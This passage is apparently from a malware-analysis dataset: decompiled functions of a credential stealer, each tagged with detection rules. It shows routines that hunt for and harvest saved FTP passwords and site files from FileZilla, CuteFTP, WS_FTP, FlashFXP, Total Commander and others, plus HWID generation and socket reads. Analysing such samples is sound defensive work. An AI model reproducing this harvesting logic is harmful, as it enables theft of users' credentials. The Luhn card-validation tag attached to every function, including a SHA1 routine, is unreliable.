        "decompiled_code": "\nvoid __cdecl fcn.00403374(int32_t arg_8h, uint32_t arg_ch, uint arg_10h)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint32_t var_8h;\n    int32_t var_4h;\n    \n    var_4h = 0;\n    var_8h = arg_ch;\n    *0x416f40 = 0x67452301;\n    *0x416f44 = 0xefcdab89;\n    *0x416f48 = 0x98badcfe;\n    *0x416f4c = 0x10325476;\n    *0x416f50 = 0xc3d2e1f0;\n    while( true ) {\n        if (var_8h < 0x40) break;\n        fcn.004017dc(arg_8h + var_4h, 0x416f54, 0x40);\n        var_4h = var_4h + 0x40;\n        fcn.004034a6();\n        var_8h = var_8h - 0x40;\n    }\n    fcn.004017dc(arg_8h + var_4h, 0x416f54, var_8h);\n    *(var_8h + 0x416f54) = 0x80;\n    iVar2 = var_8h - 0x37;\n    if (var_8h < 0x37 || iVar2 == 0) {\n        if (iVar2 == 0) goto code_r0x0040342e;\n    }\n    else {\n        iVar2 = var_8h - 0x3f;\n        if (iVar2 != 0) {\n            do {\n                *(iVar2 + 0x416f94) = 0;\n                iVar2 = iVar2 + 1;\n            } while (iVar2 < 0);\n        }\n        fcn.004034a6();\n        iVar2 = -0x38;\n    }\n    do {\n        *(iVar2 + 0x416f8c) = 0;\n        iVar2 = iVar2 + 1;\n    } while (iVar2 < 0);\ncode_r0x0040342e:\n    uVar1 = arg_ch * 8;\n    *0x416f90 = uVar1 >> 0x18 | (uVar1 & 0xff0000) >> 8 | (uVar1 & 0xff00) << 8 | uVar1 << 0x18;\n    *0x416f8c = (arg_ch * 8 >> 0x20) << 0x18;\n    fcn.004034a6();\n    *0x416f40 = *0x416f40 >> 0x18 | (*0x416f40 & 0xff0000) >> 8 | (*0x416f40 & 0xff00) << 8 | *0x416f40 << 0x18;\n    *0x416f44 = *0x416f44 >> 0x18 | (*0x416f44 & 0xff0000) >> 8 | (*0x416f44 & 0xff00) << 8 | *0x416f44 << 0x18;\n    *0x416f48 = *0x416f48 >> 0x18 | (*0x416f48 & 0xff0000) >> 8 | (*0x416f48 & 0xff00) << 8 | *0x416f48 << 0x18;\n    *0x416f4c = *0x416f4c >> 0x18 | (*0x416f4c & 0xff0000) >> 8 | (*0x416f4c & 0xff00) << 8 | *0x416f4c << 0x18;\n    *0x416f50 = *0x416f50 >> 0x18 | (*0x416f50 & 0xff0000) >> 8 | (*0x416f50 & 0xff00) << 8 | *0x416f50 << 0x18;\n    fcn.004017dc(0x416f40, arg_10h, 0x14);\n    return;\n}\n",
        "token_count": 959
    },
    "004034a6": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop",
            "hash data using SHA1"
        ],
        "decompiled_code": "\nvoid fcn.004034a6(void)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    uint32_t var_8h;\n    uint32_t var_4h;\n    \n    iVar3 = -8;\n    do {\n        uVar1 = *(iVar3 * 8 + 0x416f94);\n        uVar5 = *(iVar3 * 8 + 0x416f98);\n        *(iVar3 * 8 + 0x416f94) = uVar1 >> 0x18 | (uVar1 & 0xff0000) >> 8 | (uVar1 & 0xff00) << 8 | uVar1 << 0x18;\n        *(iVar3 * 8 + 0x416f98) = uVar5 >> 0x18 | (uVar5 & 0xff0000) >> 8 | (uVar5 & 0xff00) << 8 | uVar5 << 0x18;\n        iVar3 = iVar3 + 1;\n    } while (iVar3 != 0);\n    iVar3 = -0x40;\n    do {\n        uVar1 = *(iVar3 * 4 + 0x417088) ^ *(iVar3 * 4 + 0x41705c) ^ *(iVar3 * 4 + 0x417074) ^ *(iVar3 * 4 + 0x417054);\n        *(iVar3 * 4 + 0x417094) = uVar1 << 1 | uVar1 < 0;\n        iVar3 = iVar3 + 1;\n    } while (iVar3 != 0);\n    var_4h = *0x416f4c;\n    var_8h = *0x416f50;\n    iVar3 = -0x14;\n    uVar1 = *0x416f40;\n    uVar5 = *0x416f44;\n    uVar4 = *0x416f48;\n    do {\n        uVar7 = uVar4;\n        uVar6 = uVar1;\n        iVar2 = (uVar7 & uVar5 | ~uVar5 & var_4h) + *(iVar3 * 4 + 0x416fa4) + var_8h;\n        var_8h = var_4h;\n        uVar4 = uVar5 << 0x1e | uVar5 >> 2;\n        uVar1 = (uVar6 << 5 | uVar6 >> 0x1b) + iVar2 + 0x5a827999;\n        iVar3 = iVar3 + 1;\n        uVar5 = uVar6;\n        var_4h = uVar7;\n    } while (iVar3 != 0);\n    iVar3 = -0x14;\n    do {\n        uVar7 = uVar4;\n        uVar5 = uVar1;\n        iVar2 = (uVar6 ^ var_4h ^ uVar7) + *(iVar3 * 4 + 0x416ff4) + var_8h;\n        var_8h = var_4h;\n        uVar4 = uVar6 << 0x1e | uVar6 >> 2;\n        uVar1 = (uVar5 << 5 | uVar5 >> 0x1b) + iVar2 + 0x6ed9eba1;\n        iVar3 = iVar3 + 1;\n        uVar6 = uVar5;\n        var_4h = uVar7;\n    } while (iVar3 != 0);\n    iVar3 = -0x14;\n    do {\n        uVar7 = uVar4;\n        uVar6 = uVar1;\n        iVar2 = ((uVar7 | var_4h) & uVar5 | var_4h & uVar7) + *(iVar3 * 4 + 0x417044) + var_8h;\n        var_8h = var_4h;\n        uVar4 = uVar5 << 0x1e | uVar5 >> 2;\n        uVar1 = (uVar6 << 5 | uVar6 >> 0x1b) + iVar2 + -0x70e44324;\n        iVar3 = iVar3 + 1;\n        uVar5 = uVar6;\n        var_4h = uVar7;\n    } while (iVar3 != 0);\n    iVar3 = -0x14;\n    do {\n        var_4h = uVar7;\n        uVar7 = uVar4;\n        uVar5 = uVar1;\n        iVar2 = (uVar6 ^ var_4h ^ uVar7) + *(iVar3 * 4 + 0x417094) + var_8h;\n        var_8h = var_4h;\n        uVar4 = uVar6 << 0x1e | uVar6 >> 2;\n        uVar1 = (uVar5 << 5 | uVar5 >> 0x1b) + iVar2 + -0x359d3e2a;\n        iVar3 = iVar3 + 1;\n        uVar6 = uVar5;\n    } while (iVar3 != 0);\n    *0x416f40 = *0x416f40 + uVar1;\n    *0x416f44 = *0x416f44 + uVar5;\n    *0x416f48 = *0x416f48 + uVar4;\n    *0x416f4c = *0x416f4c + uVar7;\n    *0x416f50 = *0x416f50 + var_4h;\n    return;\n}\n",
        "token_count": 1286
    },
    "00403794": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop",
            "receive data on socket",
            "receive data"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: buf\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.00403794(uint s, int32_t *arg_ch, uint32_t arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint buf;\n    \n    iVar3 = 0;\n    iVar1 = fcn.00403734(s, 0x5a);\n    do {\n        if (iVar1 == 0) {\n            return iVar3;\n        }\n        iVar1 = fcn.00403734(s, 0x5a);\n        if (iVar1 == 0) {\n            return iVar3;\n        }\n        iVar1 = sub.wsock32.dll_recv(s, &buf, 1, 0);\n        if (iVar1 < 1) {\n            return iVar3;\n        }\n        if (buf == arg_14h) {\n            iVar3 = 1;\n        }\n        (**(*arg_ch + 0x10))(arg_ch, &buf, 1, 0);\n        uVar2 = fcn.00401091(arg_ch);\n        iVar1 = iVar3;\n    } while (uVar2 < arg_10h);\n    return iVar3;\n}\n",
        "token_count": 288
    },
    "00403a61": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00403a61(uint s)\n\n{\n    uint var_4h;\n    \n    var_4h._0_2_ = 1;\n    var_4h._2_2_ = 0x2d;\n    sub.wsock32.dll_setsockopt(s, 0xffff, 0x80, &var_4h, 4);\n    return;\n}\n",
        "token_count": 96
    },
    "00403cf6": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00403cf6(void)\n\n{\n    uint lpWSAData;\n    \n    sub.wsock32.dll_WSAStartup(0x101, &lpWSAData);\n    return;\n}\n",
        "token_count": 44
    },
    "00404267": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00404267(void)\n\n{\n    int32_t iVar1;\n    uint arg_10h;\n    char *in_stack_ffffff64;\n    uint32_t var_78h;\n    uint lpString;\n    uint pguid;\n    ushort var_ch;\n    ushort var_ah;\n    uchar var_8h;\n    uchar var_7h;\n    uchar var_6h;\n    uchar var_5h;\n    uchar var_4h;\n    uchar var_3h;\n    uchar var_2h;\n    uint var_1h;\n    \n    iVar1 = fcn.00402619(\"HWID\", &var_78h);\n    if ((iVar1 == 0) || (var_78h < 0x15)) {\n        iVar1 = sub.ole32.dll_CoCreateGuid(&pguid, iVar1);\n        if (-1 < iVar1) {\n            sub.user32.dll_wsprintfA\n                      (&lpString, 0x4127f0, pguid, var_ch, var_ah, var_8h, var_7h, var_6h, var_5h, var_4h, var_3h, \n                       var_2h, var_1h);\n            arg_10h = sub.kernel32.dll_lstrlenA(&lpString);\n            in_stack_ffffff64 = \"HWID\";\n            fcn.004024ff(\"HWID\", &lpString, arg_10h);\n        }\n    }\n    fcn.0040178e(in_stack_ffffff64);\n    return;\n}\n",
        "token_count": 362
    },
    "00404790": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404790(uint arg_8h)\n\n{\n    uint arg_ch;\n    uint var_4h;\n    \n    arg_ch = fcn.004015a9(arg_8h, 1, 0);\n    fcn.00404616(arg_8h, \"Software\\\\Far\\\\Plugins\\\\FTP\\\\Hosts\");\n    fcn.00404616(arg_8h, \"Software\\\\Far2\\\\Plugins\\\\FTP\\\\Hosts\");\n    fcn.00404616(arg_8h, \"Software\\\\Far Manager\\\\Plugins\\\\FTP\\\\Hosts\");\n    fcn.00404508(arg_8h, \"Software\\\\Far\\\\SavedDialogHistory\\\\FTPHost\");\n    fcn.00404508(arg_8h, \"Software\\\\Far2\\\\SavedDialogHistory\\\\FTPHost\");\n    fcn.00404508(arg_8h, \"Software\\\\Far Manager\\\\SavedDialogHistory\\\\FTPHost\");\n    fcn.004015ef(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 219
    },
    "0040494c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "get common file path"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040494c(uint arg_8h)\n\n{\n    uint arg_ch;\n    uint uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    arg_ch = fcn.004015a9(arg_8h, 2, 0);\n    str._cx_ftp.ini[0] = 'w';\n    str.Software_hislerWindows_Commander[9] = 0x47;\n    str.Software_hislerTotal_Commander[9] = 0x47;\n    uVar1 = fcn.004017a5(0x105);\n    uVar2 = sub.kernel32.dll_GetWindowsDirectoryA(uVar1, 0x104);\n    if ((uVar2 == 0) || (0x104 < uVar2)) {\n        fcn.0040178e(uVar1);\n    }\n    else {\n        fcn.00404819(arg_8h, uVar1);\n    }\n    uVar1 = fcn.00401cc2(0x28);\n    fcn.00404819(arg_8h, uVar1);\n    iVar3 = fcn.00401cc2(0x1a);\n    if (iVar3 != 0) {\n        uVar1 = fcn.00401c5d(iVar3, \"\\\\GHISLER\");\n        fcn.00404819(arg_8h, uVar1);\n    }\n    iVar3 = fcn.00401cc2(0x23);\n    if (iVar3 != 0) {\n        uVar1 = fcn.00401c5d(iVar3, \"\\\\GHISLER\");\n        fcn.00404819(arg_8h, uVar1);\n    }\n    iVar3 = fcn.00401cc2(0x1c);\n    if (iVar3 != 0) {\n        uVar1 = fcn.00401c5d(iVar3, \"\\\\GHISLER\");\n        fcn.00404819(arg_8h, uVar1);\n    }\n    uVar1 = fcn.00401b82(*0x4120d5, \"Software\\\\_hisler\\\\Windows Commander\", \"InstallDir\", 0);\n    fcn.00404819(arg_8h, uVar1);\n    iVar3 = fcn.00401b82(*0x4120d5, \"Software\\\\_hisler\\\\Windows Commander\", \"FtpIniName\", 0);\n    if (iVar3 != 0) {\n        fcn.00404802(arg_8h, iVar3);\n        fcn.0040178e(iVar3);\n    }\n    uVar1 = fcn.00401b82(*0x4120d5, \"Software\\\\_hisler\\\\Total Commander\", \"InstallDir\", 0);\n    fcn.00404819(arg_8h, uVar1);\n    iVar3 = fcn.00401b82(*0x4120d5, \"Software\\\\_hisler\\\\Total Commander\", \"FtpIniName\", 0);\n    if (iVar3 != 0) {\n        fcn.00404802(arg_8h, iVar3);\n        fcn.0040178e(iVar3);\n    }\n    uVar1 = fcn.00401b82(0x80000002, \"Software\\\\_hisler\\\\Windows Commander\", \"InstallDir\", 0);\n    fcn.00404819(arg_8h, uVar1);\n    iVar3 = fcn.00401b82(0x80000002, \"Software\\\\_hisler\\\\Windows Commander\", \"FtpIniName\", 0);\n    if (iVar3 != 0) {\n        fcn.00404802(arg_8h, iVar3);\n        fcn.0040178e(iVar3);\n    }\n    uVar1 = fcn.00401b82(0x80000002, \"Software\\\\_hisler\\\\Total Commander\", \"InstallDir\", 0);\n    fcn.00404819(arg_8h, uVar1);\n    iVar3 = fcn.00401b82(0x80000002, \"Software\\\\_hisler\\\\Total Commander\", \"FtpIniName\", 0);\n    if (iVar3 != 0) {\n        fcn.00404802(arg_8h, iVar3);\n        fcn.0040178e(iVar3);\n    }\n    fcn.004015ef(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 1001
    },
    "00404d0f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404d0f(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t lpString2;\n    int32_t var_4h;\n    \n    var_4h = 0;\n    lpString2 = fcn.00401cc2(arg_ch);\n    if (lpString2 != 0) {\n        fcn.00401c09(lpString2, arg_10h);\n        fcn.0040178e(lpString2);\n        var_4h = lpString2;\n    }\n    fcn.00404b83(arg_8h, var_4h, 1);\n    fcn.0040178e(var_4h);\n    return;\n}\n",
        "token_count": 161
    },
    "00404d5b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "get common file path",
            "read .ini file",
            "gather ws-ftp information"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404d5b(uint arg_8h)\n\n{\n    uint32_t uVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint arg_ch;\n    uint var_110h;\n    uint var_109h;\n    uint var_4h;\n    \n    var_4h = fcn.004015a9(arg_8h, 3, 0);\n    uVar1 = sub.kernel32.dll_GetWindowsDirectoryA(&var_109h, 0x104);\n    if ((uVar1 != 0) && (uVar1 < 0x105)) {\n        uVar2 = fcn.00401c09(&var_109h, \"\\\\win.ini\");\n        iVar3 = sub.kernel32.dll_GetPrivateProfileStringA(\"WS_FTP\", 0x4129fc, 0x4120b3, &var_109h, 0x104, uVar2);\n        if (iVar3 != 0) {\n            fcn.00404b83(arg_8h, &var_109h, 0);\n        }\n        iVar3 = sub.kernel32.dll_GetPrivateProfileStringA(\"WS_FTP\", \"DEFDIR\", 0x4120b3, &var_109h, 0x104, uVar2);\n        if (iVar3 != 0) {\n            fcn.00404b83(arg_8h, &var_109h, 0);\n        }\n        fcn.0040178e(uVar2);\n    }\n    iVar3 = fcn.00401cc2(0x2b);\n    if (iVar3 != 0) {\n        arg_ch = fcn.00401c5d(iVar3, \"\\\\Ipswitch\\\\WS_FTP\");\n        uVar2 = arg_8h;\n        fcn.00404b83(arg_8h, arg_ch, 0);\n        fcn.0040178e(uVar2);\n    }\n    fcn.00404d0f(arg_8h, 0x1a, \"\\\\Ipswitch\");\n    fcn.00404d0f(arg_8h, 0x23, \"\\\\Ipswitch\");\n    fcn.00404d0f(arg_8h, 0x1c, \"\\\\Ipswitch\");\n    fcn.004015ef(arg_8h, var_4h);\n    return;\n}\n",
        "token_count": 524
    },
    "00404ea9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404ea9(uint arg_8h, uint arg_ch)\n\n{\n    int32_t arg_ch_00;\n    uint var_8h;\n    uint var_4h;\n    \n    var_4h = 0;\n    arg_ch_00 = fcn.00401b82(*0x4120d5, arg_ch, \"QCHistory\", &var_4h);\n    if (arg_ch_00 != 0) {\n        fcn.00403d12(arg_8h, arg_ch_00, var_4h, 0xbeef0001);\n        fcn.0040178e(arg_ch_00);\n    }\n    return;\n}\n",
        "token_count": 151
    },
    "0040502a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "gather cuteftp information"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040502a(uint arg_8h, uint arg_ch)\n\n{\n    int32_t lpString2;\n    uint uVar1;\n    uint uVar2;\n    uint var_4h;\n    \n    lpString2 = fcn.00401cc2(arg_ch);\n    if (lpString2 != 0) {\n        uVar1 = fcn.00401c09(lpString2, \"\\\\GlobalSCAPE\\\\CuteFTP\");\n        uVar2 = arg_8h;\n        fcn.00404ef3(arg_8h, uVar1, \"\\\\sm.dat\");\n        fcn.0040178e(uVar2);\n        uVar1 = fcn.00401c09(lpString2, \"\\\\GlobalSCAPE\\\\CuteFTP Pro\");\n        uVar2 = arg_8h;\n        fcn.00404ef3(arg_8h, uVar1, \"\\\\sm.dat\");\n        fcn.0040178e(uVar2);\n        uVar1 = fcn.00401c09(lpString2, \"\\\\GlobalSCAPE\\\\CuteFTP Lite\");\n        uVar2 = arg_8h;\n        fcn.00404ef3(arg_8h, uVar1, \"\\\\sm.dat\");\n        fcn.0040178e(uVar2);\n        uVar2 = fcn.00401c09(lpString2, \"\\\\CuteFTP\");\n        fcn.00404ef3(arg_8h, uVar2, \"\\\\sm.dat\");\n        fcn.0040178e(arg_8h);\n        fcn.0040178e(lpString2);\n    }\n    return;\n}\n",
        "token_count": 355
    },
    "004051e5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004051e5(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t lpString2;\n    uint uVar1;\n    uint var_4h;\n    \n    lpString2 = fcn.00401b82(arg_ch, arg_10h, arg_14h, 0);\n    if (lpString2 != 0) {\n        uVar1 = fcn.00401c09(lpString2, \"\\\\Sites.dat\");\n        fcn.004051c2(arg_8h, uVar1, 0xbeef0000);\n        uVar1 = fcn.00401c09(lpString2, \"\\\\Quick.dat\");\n        fcn.004051c2(arg_8h, uVar1, 0xbeef0001);\n        uVar1 = fcn.00401c09(lpString2, 0x412c46);\n        fcn.004051c2(arg_8h, uVar1, 0xbeef0002);\n        fcn.0040178e(lpString2);\n    }\n    return;\n}\n",
        "token_count": 248
    },
    "004052aa": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004052aa(uint arg_8h, uint arg_ch)\n\n{\n    int32_t arg_ch_00;\n    uint var_4h;\n    \n    arg_ch_00 = fcn.00401cc2(arg_ch);\n    if (arg_ch_00 != 0) {\n        fcn.0040525f(arg_8h, arg_ch_00, \"\\\\Sites.dat\", 0xbeef0000);\n        fcn.0040525f(arg_8h, arg_ch_00, \"\\\\Quick.dat\", 0xbeef0001);\n        fcn.0040525f(arg_8h, arg_ch_00, 0x412c46, 0xbeef0002);\n        fcn.0040178e(arg_ch_00);\n    }\n    return;\n}\n",
        "token_count": 175
    },
    "0040530a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040530a(uint arg_8h)\n\n{\n    uint arg_ch;\n    uint var_4h;\n    \n    arg_ch = fcn.004015a9(arg_8h, 5, 0);\n    str._oftwareFlashFXP3[0] = 'S';\n    str._oftwareFlashFXP[0] = 'S';\n    str._oftwareFlashFXP4[0] = 'S';\n    *0x412c47 = 0x48;\n    fcn.004051e5(arg_8h, *0x4120d5, \"_oftware\\\\FlashFXP\\\\3\", \"InstallerDathPath\");\n    fcn.004051e5(arg_8h, *0x4120d5, \"_oftware\\\\FlashFXP\", \"path\");\n    fcn.004051e5(arg_8h, *0x4120d5, \"_oftware\\\\FlashFXP\\\\3\", \"Install Path\");\n    fcn.004051e5(arg_8h, *0x4120d5, \"_oftware\\\\FlashFXP\\\\3\", \"DataFolder\");\n    fcn.004051e5(arg_8h, *0x4120d5, \"_oftware\\\\FlashFXP\\\\4\", \"InstallerDathPath\");\n    fcn.004051e5(arg_8h, *0x4120d5, \"_oftware\\\\FlashFXP\\\\4\", \"path\");\n    fcn.004051e5(arg_8h, *0x4120d5, \"_oftware\\\\FlashFXP\\\\4\", \"Install Path\");\n    fcn.004051e5(arg_8h, *0x4120d5, \"_oftware\\\\FlashFXP\\\\4\", \"DataFolder\");\n    fcn.004051e5(arg_8h, 0x80000002, \"_oftware\\\\FlashFXP\\\\3\", \"InstallerDathPath\");\n    fcn.004051e5(arg_8h, 0x80000002, \"_oftware\\\\FlashFXP\", \"path\");\n    fcn.004051e5(arg_8h, 0x80000002, \"_oftware\\\\FlashFXP\\\\3\", \"Install Path\");\n    fcn.004051e5(arg_8h, 0x80000002, \"_oftware\\\\FlashFXP\\\\3\", \"DataFolder\");\n    fcn.004051e5(arg_8h, 0x80000002, \"_oftware\\\\FlashFXP\\\\4\", \"InstallerDathPath\");\n    fcn.004051e5(arg_8h, 0x80000002, \"_oftware\\\\FlashFXP\\\\4\", \"path\");\n    fcn.004051e5(arg_8h, 0x80000002, \"_oftware\\\\FlashFXP\\\\4\", \"Install Path\");\n    fcn.004051e5(arg_8h, 0x80000002, \"_oftware\\\\FlashFXP\\\\4\", \"DataFolder\");\n    fcn.004052aa(arg_8h, 0x1a);\n    fcn.004052aa(arg_8h, 0x23);\n    fcn.004052aa(arg_8h, 0x1c);\n    fcn.004015ef(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 718
    },
    "004056dd": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "create or open registry key",
            "contain loop",
            "query or enumerate registry key",
            "gather filezilla information"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004056dd(uint arg_8h, uint lpSubKey)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint var_810h;\n    uint lpName;\n    uint var_ch;\n    int32_t dwIndex;\n    uint phkResult;\n    \n    fcn.0040557d(arg_8h, lpSubKey, 0x412cec, 0x412ce2, 0x412ce7, 0x412cf1, 0x412cf6, \"Server Type\", 0xbeef0013);\n    fcn.0040557d(arg_8h, lpSubKey, \"Server.Pass\", \"Server.Host\", \"Server.User\", \"Server.Port\", 0x412d3d, 0x412d42, \n                 0xbeef0013);\n    fcn.0040557d(arg_8h, lpSubKey, \"Last Server Pass\", \"Last Server Host\", \"Last Server User\", \"Last Server Port\", \n                 \"Last Server Path\", \"Last Server Type\", 0xbeef0014);\n    iVar1 = sub.advapi32.dll_RegOpenKeyA(*0x4120d5, lpSubKey, &phkResult);\n    if (iVar1 == 0) {\n        dwIndex = 0;\n        while( true ) {\n            var_ch = 0x7ff;\n            iVar1 = sub.advapi32.dll_RegEnumKeyExA(phkResult, dwIndex, &lpName, &var_ch, 0, 0, 0, 0);\n            if (iVar1 != 0) break;\n            uVar2 = fcn.00401c09(lpSubKey, 0x4120b1);\n            uVar2 = fcn.00401c5d(uVar2, &lpName);\n            fcn.004056dd(arg_8h, uVar2);\n            fcn.0040178e(uVar2);\n            dwIndex = dwIndex + 1;\n        }\n        sub.advapi32.dll_RegCloseKey(phkResult);\n    }\n    return;\n}\n",
        "token_count": 460
    },
    "00405804": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "gather filezilla information"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405804(uint arg_8h)\n\n{\n    uint arg_ch;\n    int32_t iVar1;\n    uint uVar2;\n    uint var_4h;\n    \n    arg_ch = fcn.004015a9(arg_8h, 6, 0);\n    fcn.004056dd(arg_8h, \"Software\\\\FileZilla\");\n    iVar1 = fcn.00401b82(*0x4120d5, \"Software\\\\FileZilla\", 0x412cd6, 0);\n    if (iVar1 != 0) {\n        uVar2 = arg_8h;\n        fcn.004054e0(arg_8h, iVar1);\n        fcn.0040178e(uVar2);\n    }\n    iVar1 = fcn.00401b82(*0x4120d5, \"Software\\\\FileZilla Client\", 0x4120b3, 0);\n    if (iVar1 != 0) {\n        uVar2 = arg_8h;\n        fcn.004054e0(arg_8h, iVar1);\n        fcn.0040178e(uVar2);\n    }\n    iVar1 = fcn.00401b82(0x80000002, \"Software\\\\FileZilla\", 0x412cd6, 0);\n    if (iVar1 != 0) {\n        uVar2 = arg_8h;\n        fcn.004054e0(arg_8h, iVar1);\n        fcn.0040178e(uVar2);\n    }\n    iVar1 = fcn.00401b82(0x80000002, \"Software\\\\FileZilla Client\", 0x4120b3, 0);\n    if (iVar1 != 0) {\n        uVar2 = arg_8h;\n        fcn.004054e0(arg_8h, iVar1);\n        fcn.0040178e(uVar2);\n    }\n    fcn.00405550(arg_8h, 0x1a);\n    fcn.00405550(arg_8h, 0x23);\n    fcn.00405550(arg_8h, 0x1c);\n    fcn.004015ef(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 502
    },
    "00405a03": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "gather bulletproof-ftp information"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405a03(uint arg_8h)\n\n{\n    uint arg_ch;\n    int32_t iVar1;\n    uint uVar2;\n    uint var_4h;\n    \n    arg_ch = fcn.004015a9(arg_8h, 8, 0);\n    iVar1 = fcn.00401b82(*0x4120d5, \"Software\\\\BPFTP\\\\Bullet Proof FTP\\\\Main\", \"LastSessionFile\", 0);\n    if (iVar1 != 0) {\n        uVar2 = arg_8h;\n        fcn.00403d67(arg_8h, iVar1, 0xbeef0001);\n        fcn.0040178e(uVar2);\n    }\n    iVar1 = fcn.00401b82(*0x4120d5, \"Software\\\\BulletProof Software\\\\BulletProof FTP Client\\\\Main\", \"LastSessionFile\", 0\n                        );\n    if (iVar1 != 0) {\n        uVar2 = arg_8h;\n        fcn.00403d67(arg_8h, iVar1, 0xbeef0001);\n        fcn.0040178e(uVar2);\n    }\n    iVar1 = fcn.00401b82(*0x4120d5, \"Software\\\\BPFTP\\\\Bullet Proof FTP\\\\Options\", \"SitesDir\", 0);\n    if (iVar1 != 0) {\n        uVar2 = arg_8h;\n        fcn.004059a5(arg_8h, iVar1);\n        fcn.0040178e(uVar2);\n    }\n    iVar1 = fcn.00401b82(*0x4120d5, \"Software\\\\BulletProof Software\\\\BulletProof FTP Client\\\\Options\", \"SitesDir\", 0);\n    if (iVar1 != 0) {\n        uVar2 = arg_8h;\n        fcn.004059a5(arg_8h, iVar1);\n        fcn.0040178e(uVar2);\n    }\n    iVar1 = fcn.00401b82(*0x4120d5, \"Software\\\\BPFTP\", \"InstallDir1\", 0);\n    if (iVar1 != 0) {\n        uVar2 = arg_8h;\n        fcn.004059a5(arg_8h, iVar1);\n        fcn.0040178e(uVar2);\n    }\n    fcn.004059d6(arg_8h, 0x1c);\n    fcn.004059d6(arg_8h, 0x1a);\n    fcn.004059d6(arg_8h, 0x23);\n    fcn.004015ef(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 598
    },
    "00405b82": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405b82(uint arg_8h)\n\n{\n    uint arg_ch;\n    uint var_4h;\n    \n    arg_ch = fcn.004015a9(arg_8h, 9, 0);\n    str._istory.dat[0] = 'H';\n    fcn.00405b21(arg_8h, 0x1a);\n    fcn.00405b21(arg_8h, 0x23);\n    fcn.00405b21(arg_8h, 0x1c);\n    fcn.004015ef(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 140
    },
    "00405c44": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405c44(uint arg_8h)\n\n{\n    uint arg_ch;\n    uint var_4h;\n    \n    arg_ch = fcn.004015a9(arg_8h, 10, 0);\n    str._ddrbk.dat[0] = 'a';\n    fcn.00405bcb(arg_8h, \"_ddrbk.dat\", 0xbeef0000);\n    fcn.00405bcb(arg_8h, \"quick.dat\", 0xbeef0001);\n    fcn.004015ef(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 136
    },
    "00405e92": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "gather ffftp information"
        ],
